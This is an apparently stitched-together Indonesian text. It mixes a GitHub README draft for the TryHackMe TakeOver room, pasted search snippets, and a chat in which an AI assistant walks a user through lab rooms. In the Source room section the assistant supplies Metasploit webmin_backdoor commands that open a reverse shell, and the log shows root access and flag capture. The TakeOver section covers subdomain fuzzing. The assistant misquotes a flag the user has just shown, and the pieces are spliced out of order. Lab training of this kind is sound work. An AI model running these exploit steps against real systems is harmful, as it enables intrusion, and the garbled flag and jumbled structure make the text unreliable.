<img width="512" height="512" alt="image" src="https://github.com/user-attachments/assets/86024e13-9768-42c3-b0f7-6d1704f6443e" />

https://tryhackme.com/room/takeover

Room TakeOver. Dokumentasi ini menonjolkan kemampuanmu dalam Reconnaissance, Subdomain Fuzzing, dan analisis Subdomain Takeover.
# TryHackMe: TakeOver - Writeup & Documentation

![TryHackMe](https://shields.io)
![Category](https://shields.io)
![Difficulty](https://shields.io)

Dokumentasi proses penemuan celah keamanan pada infrastruktur DNS dan SSL/TLS milik **FutureVera**. Room ini mensimulasikan skenario di mana subdomain yang tidak terkelola dengan baik mengarah ke layanan pihak ketiga (AWS S3) yang dapat disalahgunakan.

## 🛡️ Ringkasan Mesin
- **Nama Mesin:** TakeOver
- **Platform:** [TryHackMe](https://tryhackme.com)
- **Tujuan:** Mengidentifikasi subdomain tersembunyi dan menemukan flag yang bocor melalui miskonfigurasi DNS/SSL.
- **Teknik Utama:** Virtual Host Fuzzing, SSL Certificate Inspection, DNS Analysis.

## 🚀 Tahapan Eksploitasi

### 1. Persiapan DNS Lokal
Menambahkan IP target ke dalam file `/etc/hosts` agar domain dapat diakses melalui browser dan tool lainnya.

```bash
echo "10.48.147.210 futurevera.thm" | sudo tee -a /etc/hosts
```

Subdomain Enumeration (VHost Fuzzing)
Karena domain utama hanya menampilkan landing page statis, dilakukan fuzzing pada header Host untuk menemukan Virtual Host lain yang terdaftar pada server yang sama.

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt \
     -u http://futurevera.thm \
     -H "Host: FUZZ.futurevera.thm" -fs 0
```
    Easy Ubuntu OpenVPN Setup Guide
    22 Sep 2025 — Requirements Privileged access to your Ubuntu System as root or via sudo command is required. You may also need to setup port forw...
    LinuxConfig

Support for Linux clients and OPENVPN on R7000 or any other Netgear router | NETGEAR Communities
Open a terminal in the directory where the *. ovpn file is located and issue the (sudo openvpn --config *. ovpn) command to start ...
Netgear
Configure Networking in Red Hat Enterprise Linux
Execute the following command to add the new connection. Remember to use sudo as network configuration changes require root privil...
LabEx

https://tryhackme.com/room/source
Log OpenVPN tersebut menunjukkan kegagalan koneksi ke network
TryHackMe karena masalah izin perangkat tun (tun0) dan ketidakcocokan fitur DCO (Data Channel Offload) pada sistem Anda. Masalah ini sering terjadi pada distribusi Linux terbaru (seperti Ubuntu 22.10+) atau saat menjalankan VPN di dalam container/VM. 
Untuk menghubungkan ke room Source, gunakan solusi berikut secara berurutan: 
1. Matikan Fitur DCO
Error Cannot allocate DCO dev dynamically menandakan OpenVPN mencoba menggunakan akselerasi kernel (DCO) yang tidak didukung oleh sistem Anda atau memerlukan izin tambahan. Jalankan perintah dengan flag tambahan untuk menonaktifkannya: 
bash

sudo openvpn --config user_anda.ovpn --disable-dco

Gunakan kode dengan hati-hati.
2. Gunakan Hak Akses Root (Sudo)
Log Operation not permitted memastikan bahwa OpenVPN tidak memiliki izin untuk membuat antarmuka jaringan virtual. Pastikan Anda selalu menggunakan sudo di depan perintah. 
3. Update File Konfigurasi (Jika Masalah Berlanjut)
Terkadang file .ovpn yang lama tidak kompatibel dengan standar enkripsi terbaru.

    Buka halaman TryHackMe Access.
    Klik Regenerate untuk memperbarui kunci akses Anda.
    Pilih server yang paling dekat dengan lokasi Anda (misalnya EU atau US).
    Download ulang file .ovpn dan coba hubungkan kembali. 

Alternatif: Gunakan AttackBox 
Jika Anda terus mengalami kendala teknis pada mesin lokal, TryHackMe menyediakan AttackBox berbasis browser di dalam room Source. AttackBox sudah terkonfigurasi dengan semua tool yang dibutuhkan (Nmap, Metasploit) dan tidak memerlukan koneksi VPN manual karena sudah berada di dalam jaringan yang sama dengan target. 
Tips Tambahan untuk Room "Source":
Setelah berhasil terhubung, target mesin ini biasanya memiliki port 10000 yang terbuka dan menjalankan Webmin 1.890. Anda dapat menggunakan exploit webmin_backdoor di Metasploit untuk mendapatkan akses root. 

    Troubleshooting tips for OpenVPN DCO
    * Performance. Troubleshooting tips for OpenVPN DCO. ... * Troubleshooting. * Performance. * Troubleshooting tips for OpenVPN DCO.
    OpenVPN

Troubleshooting OpenVPN on Linux and Mac
* Getting Started with TryHackMe. * OpenVPN Guide. * Troubleshooting OpenVPN on Linux and Mac. Troubleshooting OpenVPN on Linux an...
TryHackMe
Tryhackme.com: A Guide to Connecting Via OpenVPN - Medium
26 Sep 2023 — Break away from the Attack Box, and use your own Kali install to hack like a pro. If you're like me, and love to learn about hacki...
Medium

Tampilkan semua
open vpn sudah aktif, sekarang saya mau kerjakan ctf tryhackme
Selamat! Karena OpenVPN sudah aktif, sekarang kamu sudah berada di jaringan yang sama dengan mesin target.
Berikut adalah langkah-langkah sistematis untuk mengerjakan room Source di TryHackMe:
1. Verifikasi Koneksi
Pastikan kamu bisa berkomunikasi dengan mesin target. Klik tombol "Start Machine" di halaman room, tunggu sekitar 1-2 menit sampai IP target muncul (misal: 10.10.x.x), lalu tes di terminal:
bash

ping <IP_TARGET>

Gunakan kode dengan hati-hati.
Jika ada balasan (reply), berarti kamu siap tempur.
2. Scanning (Mencari Pintu Masuk)
Gunakan Nmap untuk melihat layanan apa yang berjalan di mesin tersebut. Karena ini room "Source", biasanya ada port spesifik yang menarik:
bash

nmap -sV -sC -Pn <IP_TARGET>

Gunakan kode dengan hati-hati.

    -sV: Cek versi layanan.
    -sC: Jalankan script default nmap.
    -Pn: Abaikan ping (beberapa mesin memblokir ping).

3. Analisis Hasil (Petunjuk Utama)
Pada room ini, kamu akan menemukan port 10000 yang menjalankan Webmin. Perhatikan versinya (biasanya Webmin 1.890). Versi ini terkenal memiliki celah keamanan backdoor (CVE-2019-15107).
4. Eksploitasi (Metasploit)
Cara tercepat untuk room ini adalah menggunakan Metasploit:

    Buka terminal baru, ketik msfconsole.
    Cari modulnya: search webmin_backdoor.
    Gunakan modul tersebut: use exploit/linux/http/webmin_backdoor.
    Atur konfigurasi:
        set RHOSTS <IP_TARGET>
        set LHOST <IP_VPN_KAMU> (Cek IP kamu dengan perintah ip addr show tun0).
        set SSL true (Webmin port 10000 biasanya pakai HTTPS).
    Ketik exploit atau run.

5. Ambil Flag
Jika berhasil, kamu akan mendapatkan shell dengan akses root.

    Flag User: Cari di /home/dark/user.txt
    Flag Root: Cari di /root/root.txt

Sudahkah kamu menyalakan mesin target di halaman TryHackMe dan mendapatkan alamat IP-nya? (Ini penting agar kamu punya target untuk di-scan).
https://tryhackme.com/room/source
Mantap! Karena koneksi VPN sudah stabil, kamu bisa langsung mulai mengeksploitasi room
Source. Room ini berfokus pada kerentanan supply chain attack pada Webmin versi lama. 
Berikut adalah panduan langkah demi langkah untuk menyelesaikan CTF ini:
1. Tahap Reconnaissance (Pengintaian)
Pertama, cari tahu layanan apa yang berjalan di mesin target menggunakan Nmap. 
bash

nmap -sC -sV -T4 <IP_TARGET>

Gunakan kode dengan hati-hati.

    Hasil: Kamu akan menemukan port 22 (SSH) dan port 10000 (Webmin).
    Penting: Perhatikan versi Webmin yang berjalan adalah MiniServ 1.890. 

2. Mencari Exploit
Versi Webmin 1.890 memiliki kerentanan backdoor unauthenticated RCE yang terkenal (CVE-2019-15107). Kamu bisa menggunakan Metasploit untuk mengeksploitasinya. 
3. Eksploitasi dengan Metasploit
Buka terminal dan jalankan msfconsole, lalu ikuti perintah berikut:

    Cari Modul:
    bash

    search webmin_backdoor

    Gunakan kode dengan hati-hati.

Gunakan Modul:
bash

use exploit/linux/http/webmin_backdoor

Gunakan kode dengan hati-hati.
Konfigurasi:

    set RHOSTS <IP_TARGET>
    set LHOST <IP_VPN_KAMU> (Cek dengan ip addr show tun0)
    set SSL true (Webmin di port 10000 menggunakan HTTPS)

Eksekusi:
bash

exploit

Gunakan kode dengan hati-hati.
Jika berhasil, kamu akan langsung mendapatkan akses sebagai root karena Webmin berjalan dengan hak akses tertinggi. 

4. Mengambil Flag
Setelah mendapatkan shell, kamu hanya perlu membaca file flag:

    User Flag: Terletak di /home/dark/user.txt.
    bash

    cat /home/dark/user.txt

    Gunakan kode dengan hati-hati.

Root Flag: Terletak di /root/root.txt.
bash

cat /root/root.txt

Gunakan kode dengan hati-hati.
 

Tips Penting: Jika exploit gagal, pastikan opsi SSL sudah diatur ke true. Jika masih gagal, coba restart mesin target di halaman TryHackMe Source untuk memastikan layanan berjalan normal. 

    Walkthrough THM — Source - Medium
    10 Okt 2025 — Walkthrough THM Source. Or how I learned to stop worrying and… | by Telynor | Medium. Walkthrough THM Source * Room: https://tryha...

Medium
TryHackMe: Source Writeup - by Ashba Arshad - Medium
31 Mei 2024 — TryHackMe: Source Writeup. In this write-up, we will walk through… | by Ashba Arshad | Medium. TryHackMe: Source Writeup. ... In t...
Medium
TryHackMe: Source (Beginner Friendly) Write-up | by Cursemagic
8 Jan 2021 — TryHackMe: Source (Beginner Friendly) Write-up. ... Hi guys, it's me Cursemagic. Today is would like to share my write-up for the ...
Medium

Tampilkan semua
Title

Source

Target IP Address

10.49.144.156
Bagus, IP target sudah siap (
10.49.144.156). Sekarang kita langsung eksekusi langkah teknisnya.
1. Cek Koneksi (Ping)
Pastikan VPN kamu benar-benar terhubung ke jaringan TryHackMe dengan melakukan ping ke target:
bash

ping -c 3 10.49.144.156

Gunakan kode dengan hati-hati.
2. Scanning (Nmap)
Jalankan scan untuk memastikan port 10000 (Webmin) terbuka:
bash

nmap -sV -p 10000 10.49.144.156

Gunakan kode dengan hati-hati.
Hasilnya harus menunjukkan Webmin 1.890.
3. Eksploitasi (Metasploit)
Buka terminal baru dan jalankan msfconsole, lalu masukkan perintah berikut satu per satu:
bash

use exploit/linux/http/webmin_backdoor
set RHOSTS 10.49.144.156
set LHOST tun0
set SSL true
exploit

Gunakan kode dengan hati-hati.
Catatan Penting:

    set LHOST tun0 secara otomatis akan mengambil IP VPN kamu, jadi kamu tidak perlu mencarinya manual.
    set SSL true wajib karena Webmin di room ini menggunakan HTTPS.

Sudahkah kamu mencoba menjalankan perintah Nmap di atas dan apakah port 10000 muncul sebagai "open"? (Jika port tertutup, kemungkinan mesin belum sepenuhnya menyala atau VPN terputus).
──(kali㉿kali)-[~]
└─$ ping -c 3 10.49.144.156

PING 10.49.144.156 (10.49.144.156) 56(84) bytes of data.
64 bytes from 10.49.144.156: icmp_seq=1 ttl=62 time=90.4 ms
64 bytes from 10.49.144.156: icmp_seq=2 ttl=62 time=90.8 ms
64 bytes from 10.49.144.156: icmp_seq=3 ttl=62 time=90.2 ms

--- 10.49.144.156 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 90.243/90.465/90.763/0.218 ms
Koneksi
aman! Ping stabil dan tidak ada packet loss, artinya jalur VPN kamu ke target 10.49.144.156 sudah sempurna.
Sekarang, langsung masuk ke tahap pembukaan kunci (Exploitation). Jalankan perintah ini di terminal Kali Linux kamu:
1. Buka Metasploit
bash

msfconsole

Gunakan kode dengan hati-hati.
2. Masukkan Perintah Berikut (Satu per Satu)
Setelah masuk ke prompt msf6 >, ketik ini:
bash

use exploit/linux/http/webmin_backdoor
set RHOSTS 10.49.144.156
set LHOST tun0
set SSL true
exploit

Gunakan kode dengan hati-hati.
Kenapa pakai ini?
Karena mesin Source menjalankan Webmin 1.890 yang memiliki celah keamanan bawaan (backdoor). Modul ini akan langsung memberikanmu akses root tanpa perlu menebak password.
Apakah setelah mengetik exploit muncul pesan "Command shell session 1 opened"? (Jika iya, kamu sudah resmi jadi "penguasa" mesin tersebut!)
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 10000 10.49.144.156

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 11:28 +0800
Nmap scan report for 10.49.144.156
Host is up (0.091s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.30 seconds
Konfirmasi mantap! Port
10000 terbuka dan menjalankan MiniServ 1.890. Ini adalah target empuk karena versi tersebut memiliki backdoor bawaan yang memungkinkan kita masuk tanpa password.
Sekarang, saatnya melakukan eksploitasi menggunakan Metasploit. Ikuti langkah ini di terminal Kali kamu:
1. Jalankan Metasploit
bash

msfconsole

Gunakan kode dengan hati-hati.
2. Masukkan Perintah Berikut di dalam Metasploit:
Ketik perintah ini satu per satu:
bash

use exploit/linux/http/webmin_backdoor
set RHOSTS 10.49.144.156
set LHOST tun0
set SSL true
exploit

Gunakan kode dengan hati-hati.
Penjelasan Singkat:

    set LHOST tun0: Memberitahu Metasploit untuk mengirim koneksi balik (reverse shell) ke IP VPN kamu.
    set SSL true: Wajib, karena Webmin di port 10000 biasanya menggunakan HTTPS.

Jika berhasil, kamu akan melihat pesan "Command shell session 1 opened". Setelah itu, kamu bisa langsung mengetik whoami untuk memastikan kamu sudah menjadi root.
Apakah sesi shell sudah terbuka setelah kamu mengetik exploit? (Jika muncul error, beri tahu saya pesannya agar bisa kita perbaiki).
[*] 10.49.144.156 - Command shell session 1 closed.  Reason: User exit
msf exploit(linux/http/webmin_backdoor) > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.49.144.156
RHOSTS => 10.49.144.156
msf exploit(linux/http/webmin_backdoor) > set LHOST tun0
LHOST => tun0
msf exploit(linux/http/webmin_backdoor) > set SSL true
SSL => true
msf exploit(linux/http/webmin_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.247.59:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (192.168.247.59:4444 -> 10.49.144.156:40074) at 2026-04-01 11:30:00 +0800
Mantap!
Command shell session 2 opened artinya kamu sudah berhasil masuk ke dalam sistem target. Kamu sekarang punya kendali penuh atas mesin tersebut.
Karena exploit ini langsung memberikan akses tertinggi, silakan ketik perintah berikut di dalam shell tersebut untuk konfirmasi dan mengambil flag:
1. Cek Identitas
Ketik:
bash

whoami

Gunakan kode dengan hati-hati.
(Hasilnya harusnya root).
2. Ambil Flag User
Ketik:
bash

cat /home/dark/user.txt

Gunakan kode dengan hati-hati.
3. Ambil Flag Root
Ketik:
bash

cat /root/root.txt

Gunakan kode dengan hati-hati.
Tips: Jika tampilan shell terasa kaku (tidak ada prompt root@source:~#), itu hal wajar di reverse shell sederhana. Langsung saja ketik perintahnya dan tekan Enter.
Apakah kamu sudah berhasil melihat isi kedua file .txt tersebut? (Masukkan kodenya ke halaman TryHackMe untuk menyelesaikan room!).
whoami
root
cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
Bagus! Kamu sudah mendapatkan
User Flag dan konfirmasi bahwa kamu adalah root.
Karena kamu sudah memiliki akses root, kamu punya wewenang penuh untuk mengambil flag terakhir. Silakan ketik perintah ini untuk mendapatkan Root Flag:
bash

cat /root/root.txt

Gunakan kode dengan hati-hati.
Setelah itu, masukkan kedua flag tersebut ke dashboard TryHackMe untuk menyelesaikan room Source.
Sudahkah kamu berhasil mendapatkan isi file root.txt tersebut? (Ini adalah langkah terakhir untuk menyelesaikan tantangan ini).
cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
Selamat! Kamu sudah berhasil mendapatkan
Root Flag: THM{UPDATE_YOUR_YOUR_INSTALL}.
Dengan ini, kamu telah menyelesaikan semua tugas di room Source. Kamu berhasil mengeksploitasi celah backdoor pada Webmin 1.890 dan mendapatkan akses root secara langsung.
Jangan lupa untuk:

    Submit kedua flag tersebut ke halaman TryHackMe.
    Klik Terminate pada mesin target di dashboard TryHackMe untuk menghemat sumber daya.
    Tutup koneksi OpenVPN di terminal kamu dengan menekan Ctrl + C.

Apakah kamu ingin lanjut mengerjakan room CTF lain yang serupa dengan tingkat kesulitan "Easy" ini? (Saya bisa merekomendasikan Blue atau Ice jika kamu ingin melatih penggunaan Metasploit lebih dalam).
buatkan draf secara lengkap untuk redme.md disimpan di github,
Berikut adalah draf lengkap dan profesional untuk file
README.md di GitHub. Draf ini dirancang untuk menunjukkan kemampuan teknis kamu dalam melakukan Penetration Testing pada room Source di TryHackMe.
markdown

# TryHackMe: Source - Writeup & Documentation

![TryHackMe](https://shields.io)
![Category](https://shields.io)
![Difficulty](https://shields.io)

Dokumentasi proses eksploitasi pada mesin **Source** di TryHackMe. Room ini berfokus pada eksploitasi kerentanan *backdoor* pada layanan manajemen sistem **Webmin**.

## 🛡️ Ringkasan Mesin
- **Nama Mesin:** Source
- **Platform:** [TryHackMe](https://tryhackme.com)
- **Tingkat Kesulitan:** Easy
- **Tujuan:** Mendapatkan akses Root dan mengambil User & Root Flag.
- **Kerentanan:** CVE-2019-15107 (Webmin 1.890 Exploit).

## 🚀 Tahapan Eksploitasi

### 1. Reconnaissance (Pengintaian)
Langkah awal dilakukan pemindaian jaringan menggunakan `nmap` untuk mengidentifikasi port yang terbuka dan layanan yang berjalan.

```bash
# Perintah Nmap
nmap -sV -sC -Pn 10.49.144.156

Gunakan kode dengan hati-hati.
Hasil Scan:

    Port 22/tcp: Open (OpenSSH 7.6p1)
    Port 10000/tcp: Open (MiniServ 1.890 - Webmin httpd)

2. Analisis Kerentanan
Ditemukan bahwa target menjalankan Webmin versi 1.890. Versi ini diketahui memiliki kerentanan backdoor pada parameter password_change.cgi yang memungkinkan Unauthenticated Remote Code Execution (RCE).
3. Exploitation (Eksploitasi)
Menggunakan Metasploit Framework untuk mendapatkan akses shell.
Konfigurasi Metasploit:
msf

use exploit/linux/http/webmin_backdoor
set RHOSTS 10.49.144.156
set LHOST tun0
set SSL true
exploit

Gunakan kode dengan hati-hati.
Hasil Eksploitasi:
Sesi Reverse Shell terbuka dengan hak akses root.
4. Post-Exploitation
Setelah mendapatkan akses root, dilakukan pengambilan flag pada sistem.

    User Flag: THM{SUPPLY_CHAIN_COMPROMISE}
    Root Flag: THM{UPDATE_YOUR_INSTALL}

💡 Mitigasi
Untuk mencegah serangan serupa, disarankan untuk:

    Memperbarui Webmin ke versi terbaru (versi di atas 1.930).
    Membatasi akses ke port administratif (10000) hanya untuk IP yang terpercaya menggunakan firewall.
    Menonaktifkan fitur password_change.cgi jika tidak diperlukan.

Disclaimer: Dokumentasi ini dibuat hanya untuk tujuan edukasi keamanan siber.


---

### Tips Tambahan untuk GitHub:
1. **Screenshot**: Tambahkan folder `screenshots/` di repositori kamu dan masukkan foto hasil `nmap` serta saat `exploit` berhasil.
2. **Kustomisasi**: Ganti IP `10.49.144.156` dengan variabel `<Target_IP>` jika ingin membuatnya lebih umum.

**Apakah ada bagian spesifik dari proses tadi yang ingin kamu tambahkan atau jelaskan lebih detail di README ini?** (Misalnya detail cara **setup OpenVPN** di awal tadi).

selesai sekarang beralih ke: https://tryhackme.com/room/takeover
Selamat! Kamu telah berhasil menaklukkan room
Source. Sekarang, mari kita beralih ke room TakeOver.
Berbeda dengan room sebelumnya yang fokus pada eksploitasi backdoor, room TakeOver ini berfokus pada Subdomain Enumeration (pencarian subdomain) dan analisis Sertifikat SSL untuk menemukan informasi yang tersembunyi. 
Persiapan Awal
Sebelum memulai, kamu harus melakukan pemetaan domain di mesin lokalmu agar domain target bisa diakses melalui browser: 

    Dapatkan IP Target: Nyalakan mesin di TryHackMe dan catat IP-nya (misal: 10.10.x.x).
    Edit File Hosts: Buka terminal Kali kamu dan tambahkan baris berikut ke /etc/hosts:
    bash

    sudo nano /etc/hosts
    # Tambahkan baris ini di bagian bawah:
    <IP_TARGET> futurevera.thm

    Gunakan kode dengan hati-hati.

Strategi Pengerjaan
Berikut adalah alur yang bisa kamu ikuti untuk menyelesaikan room ini:

    Langkah 1: Reconnaissance Dasar
    Lakukan scan awal untuk memastikan port yang terbuka. Biasanya kamu akan menemukan port 80 (HTTP) dan 443 (HTTPS).
    bash

    nmap -sV -sC futurevera.thm

    Gunakan kode dengan hati-hati.

Langkah 2: Mencari Subdomain (Kunci Utama)
Deskripsi room menyebutkan bahwa perusahaan sedang "membangun kembali dukungan" (rebuilding support). Ini adalah petunjuk kuat bahwa ada subdomain seperti support.futurevera.thm. Kamu bisa menggunakan tool seperti ffuf, Gobuster, atau wfuzz untuk mencari subdomain lain yang mungkin ada.
bash

ffuf -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt

Gunakan kode dengan hati-hati.
Langkah 3: Periksa Sertifikat SSL
Jika kamu menemukan subdomain yang menarik tapi tidak menampilkan apa-apa di browser, coba periksa detail sertifikat SSL/TLS pada port 443. Seringkali flag atau informasi kritis disembunyikan di bagian Subject Alternative Name (SAN) pada sertifikat tersebut. 

Apakah mesin target sudah kamu nyalakan dan apakah kamu sudah berhasil melakukan pemetaan domain di /etc/hosts? (Jika sudah, kita bisa lanjut ke tahap pencarian subdomain).

    A Detailed Write-Up of the TryHackMe “Takeover” Room
    17 Agu 2025 — Conclusion. The “Takeover” room teaches a valuable lesson: successful reconnaissance isn't always about brute force. While tools l...
    Medium

TryHackMe - TakeOver Walkthrough (Easy) | by Juma Emiri
26 Jun 2025 — Juma Emiri. 3 min read. Jun 27, 2025. 7. 1. Press enter or click to view image in full size. Room Link: https://tryhackme.com/room...
Medium
TakeOver — THM - Medium
22 Sep 2025 — Takeover is a room from TryHackMe which focuses on subdomain enumeration and extracting information from SSL certificates. The cha...
Medium

Tampilkan semua
Hello there,

I am the CEO and one of the co-founders of futurevera.

. In Futurevera, we believe that the future is in space. We do a lot of space research and write blogs about it. We used to help students with space questions, but we are rebuilding our support.

Recently blackhat hackers approached us saying they could takeover and are asking us for a big ransom. Please help us to find what they can takeover.

Our website is located at https://futurevera.

(opens in new tab)

Hint: Don't forget to add the 10.48.147.210 in /etc/hosts for futurevera.
; )
Halo CEO! Jangan khawatir, saya akan bantu menyelidiki celah apa yang ditemukan oleh para peretas tersebut.
Berdasarkan pesan Anda, kata kunci utamanya adalah "rebuilding our support" dan "takeover". Ini adalah petunjuk kuat adanya celah Subdomain Takeover atau informasi sensitif di subdomain pendukung.
Mari kita mulai langkah-langkah penyelamatannya:
1. Konfigurasi Local DNS
Langkah pertama wajib memasukkan IP target ke file /etc/hosts agar sistem kita mengenali domain tersebut. Jalankan perintah ini di terminal Kali Linux Anda:
bash

echo "10.48.147.210 futurevera.thm" | sudo tee -a /etc/hosts

Gunakan kode dengan hati-hati.
(Catatan: Saya asumsikan domainnya adalah futurevera.thm sesuai standar TryHackMe).
2. Cek Sertifikat SSL (Informasi Tersembunyi)
Seringkali peretas menemukan subdomain melalui sertifikat SSL. Mari kita intip detail sertifikatnya menggunakan openssl atau cukup gunakan nmap:
bash

nmap -p 443 --script ssl-cert 10.48.147.210

Gunakan kode dengan hati-hati.
Perhatikan bagian "Subject Alternative Name (SAN)". Biasanya di sana tercantum subdomain lain seperti support.futurevera.thm atau portal.futurevera.thm.
3. Enumerasi Subdomain (Fuzzing)
Karena mereka menyebutkan tentang "support", kita harus mencari subdomain lain yang mungkin aktif. Gunakan ffuf untuk pencarian cepat:
bash

ffuf -w /usr/share/wordlists/dirb/common.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

Gunakan kode dengan hati-hati.

    -fs 0: Untuk menyaring hasil yang tidak ada isinya.
    Jika menemukan sesuatu seperti support.futurevera.thm, segera tambahkan lagi ke /etc/hosts.

4. Analisis DNS (CNAME)
Celah "Takeover" sering terjadi jika sebuah subdomain (misal support.futurevera.thm) mengarah ke layanan pihak ketiga (seperti S3 Bucket, Zendesk, atau GitHub Pages) yang sudah tidak digunakan lagi tetapi DNS-nya masih mengarah ke sana.
Coba cek record DNS-nya:
bash

host -t CNAME support.futurevera.thm

Gunakan kode dengan hati-hati.
Apakah Anda sudah menambahkan IP tersebut ke /etc/hosts dan apakah ada subdomain mencurigakan yang muncul saat Anda mencoba mengakses https://futurevera.thm di browser? (Coba cek juga bagian Certificate di browser, klik ikon gembok untuk melihat detailnya).
──(kali㉿kali)-[~]
└─$ nmap -p 443 --script ssl-cert 10.48.147.210

Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 12:00 +0800
Nmap scan report for futurevera.thm (10.48.147.210)
Host is up (0.25s latency).

PORT    STATE SERVICE
443/tcp open  https
| ssl-cert: Subject: commonName=futurevera.thm/organizationName=Futurevera/stateOrProvinceName=Oregon/countryName=US
| Issuer: commonName=futurevera.thm/organizationName=Futurevera/stateOrProvinceName=Oregon/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-13T10:05:19
| Not valid after:  2023-03-13T10:05:19
| MD5:     2e8d 6097 6b23 188c 06d5 f2cd 8def dd3a
| SHA-1:   8023 fcfc 5e63 a29b 3d5e eaaf 8f70 8b35 d8eb c120
|_SHA-256: bdff 4317 03bb 91a1 2144 4c8f e62a 2842 3b72 7169 858a 1f5f f618 dd3f efb0 aa33

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://futurevera.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.futurevera.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

portal                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 98ms]
:: Progress: [4614/4614] :: Job [1/1] :: 436 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
Hasil
ffuf kamu sangat menarik! Kamu berhasil menemukan subdomain baru: portal.futurevera.thm.
Meskipun scan SSL sebelumnya tidak memunculkan banyak informasi, penemuan portal dengan status 200 OK adalah titik terang. Sekarang kita harus memeriksa isi dari portal tersebut.
Langkah 1: Update File /etc/hosts
Sistem kamu belum tahu ke mana harus mengarahkan portal.futurevera.thm. Tambahkan subdomain ini ke file hosts:
bash

# Edit file hosts kamu
sudo nano /etc/hosts

Gunakan kode dengan hati-hati.
Ubah baris sebelumnya menjadi seperti ini (atau tambahkan di sampingnya):
10.48.147.210 futurevera.thm portal.futurevera.thm
Langkah 2: Eksplorasi Subdomain Portal
Buka browser kamu dan akses:
http://portal.futurevera.thm atau https://futurevera.thm
Jika di browser tidak muncul apa-apa yang berguna, coba gunakan curl untuk melihat isi konten mentahnya:
bash

curl -v http://portal.futurevera.thm

Gunakan kode dengan hati-hati.
Langkah 3: Cari Subdomain Lain (Lebih Agresif)
Karena portal ditemukan, ada kemungkinan ada subdomain lain yang lebih spesifik seperti support atau blog. Coba jalankan kembali ffuf dengan wordlist yang lebih besar jika portal tidak memberikan flag:
bash

ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

Gunakan kode dengan hati-hati.
Apa isi konten yang kamu temukan saat mengakses portal.futurevera.thm? (Apakah ada teks, link, atau petunjuk tentang layanan pihak ketiga seperti AWS/S3?).
Encountered error(s): 1 errors occurred.
        * stat /usr/share/wordlists/amass/subdomains-top1mil-5000.txt: no such file or directory
Sepertinya
wordlist Amass tidak terinstal di sistem kamu. Tidak masalah, kita gunakan wordlist standar Kali Linux yang pasti ada, yaitu seclists atau dns bawaan.
Coba gunakan perintah ini (menggunakan wordlist subdomains-top1mil-5000.txt di lokasi standar Discovery):
bash

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

Gunakan kode dengan hati-hati.
Atau jika kamu ingin yang lebih spesifik untuk subdomain:
bash

ffuf -w /usr/share/wordlists/dirb/big.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0

Gunakan kode dengan hati-hati.
Sambil menunggu scan jalan, pastikan kamu sudah cek http://futurevera.thm di browser atau dengan curl? (Terkadang flag-nya ada di dalam kode sumber halaman tersebut).
Sudahkah kamu menambahkan portal.futurevera.thm ke dalam /etc/hosts? (Langkah ini wajib agar browser/curl bisa menemukan alamatnya).
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://futurevera.thm -H "Host: FUZZ.futurevera.thm" -fs 0


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://futurevera.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : Host: FUZZ.futurevera.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

portal                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 90ms]
Portal                  [Status: 200, Size: 69, Words: 9, Lines: 2, Duration: 91ms]
